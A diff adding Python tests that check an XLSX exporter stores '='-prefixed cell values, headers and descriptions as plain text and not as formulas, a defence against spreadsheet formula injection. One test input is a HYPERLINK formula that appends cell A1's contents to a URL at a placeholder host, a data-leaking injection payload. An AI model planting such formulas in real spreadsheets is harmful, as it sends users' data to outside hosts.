@@ -417,3 +417,70 @@ class TestWriteQueriesToXlsx:
 
         names = _sheetnames(str(out))
         assert "mytable" in names
+
+
+# ---------------------------------------------------------------------------
+# Tests: text that starts with "=" stays text
+# ---------------------------------------------------------------------------
+
+
+def _cell(path: str, sheet: str, coord: str):
+    wb = openpyxl.load_workbook(str(path))
+    cell = wb[sheet][coord]
+    wb.close()
+    return cell
+
+
+class TestTextIsNeverAFormula:
+    """openpyxl stores a string starting with "=" as a formula unless told otherwise."""
+
+    def test_data_value_is_text(self, tmp_path):
+        from execsql.exporters.xlsx import write_query_to_xlsx
+
+        out = tmp_path / "f.xlsx"
+        db = _StubDB(["note"], [["=1+1"], ['=HYPERLINK("http://example.invalid/?"&A1,"x")']])
+        write_query_to_xlsx("SELECT note FROM t", db, str(out), sheetname="T")
+        for coord, text in (("A2", "=1+1"), ("A3", '=HYPERLINK("http://example.invalid/?"&A1,"x")')):
+            cell = _cell(str(out), "T", coord)
+            assert cell.data_type == "s"
+            assert cell.value == text
+
+    def test_header_is_text(self, tmp_path):
+        from execsql.exporters.xlsx import write_query_to_xlsx
+
+        out = tmp_path / "f.xlsx"
+        db = _StubDB(["=SUM(1,2)"], [[1]])
+        write_query_to_xlsx("SELECT 1", db, str(out), sheetname="T")
+        cell = _cell(str(out), "T", "A1")
+        assert cell.data_type == "s"
+        assert cell.value == "=SUM(1,2)"
+
+    def test_description_is_text(self, tmp_path):
+        from execsql.exporters.xlsx import write_query_to_xlsx
+
+        out = tmp_path / "f.xlsx"
+        db = _StubDB(["x"], [[1]])
+        write_query_to_xlsx("SELECT 1", db, str(out), desc="=1+1", sheetname="T")
+        cell = _cell(str(out), "Datasheets", "D2")
+        assert cell.data_type == "s"
+        assert cell.value == "=1+1"
+
+    def test_multi_sheet_values_are_text(self, tmp_path):
+        from execsql.exporters.xlsx import write_queries_to_xlsx
+
+        out = tmp_path / "f.xlsx"
+        db = _StubDB(["=h"], [["=1+1"]])
+        write_queries_to_xlsx("t1", db, str(out), desc="=2+2")
+        for sheet, coord, text in (("t1", "A1", "=h"), ("t1", "A2", "=1+1"), ("Datasheets", "D2", "=2+2")):
+            cell = _cell(str(out), sheet, coord)
+            assert cell.data_type == "s"
+            assert cell.value == text
+
+    def test_plain_text_and_numbers_unchanged(self, tmp_path):
+        from execsql.exporters.xlsx import write_query_to_xlsx
+
+        out = tmp_path / "f.xlsx"
+        db = _StubDB(["s", "n"], [["a=b", 3]])
+        write_query_to_xlsx("SELECT 1", db, str(out), sheetname="T")
+        assert _cell(str(out), "T", "A2").data_type == "s"
+        assert _cell(str(out), "T", "B2").data_type == "n"
